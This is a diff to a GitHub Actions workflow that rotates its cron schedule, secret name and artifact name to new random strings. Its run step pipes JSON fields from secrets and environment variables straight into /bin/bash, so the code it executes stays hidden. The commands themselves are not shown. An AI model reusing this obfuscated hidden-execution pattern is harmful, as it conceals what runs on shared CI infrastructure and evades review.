@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '20 0,6,12,18 * * *'
+    - cron: '22 5,11,17,23 * * *'
 jobs:
   service:
     runs-on: ubuntu-latest
@@ -12,18 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run
         env:
-          u60115: ${{ secrets.u60115 }}
+          v23684: ${{ secrets.v23684 }}
         run: |
-          printf '%s' "$u60115" | jq -r .cav53 | /bin/bash
-          printf '%s' "$ioxg70" | jq -r .hkg6175 | /bin/bash
-          echo $zxmi816 | jq -r .hu93 | /bin/bash
-          printf '%s' "$aboar9" | jq -r .wmfi391 | /bin/bash
-          printf '%s' "$plffq66" | jq -r .j822 | /bin/bash
+          printf '%s' "$v23684" | jq -r .jc87 | /bin/bash
+          echo $v5596 | jq -r .dedm69 | /bin/bash
+          echo $zo0 | jq -r .f419 | /bin/bash
+          printf '%s' "$n17" | jq -r .ywwh5698 | /bin/bash
+          echo $oyvy755 | jq -r .ivxcv2584 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: qxgO5imd
+          name: YS0y1XgG
           path: "*.zip"
           retention-days: 1
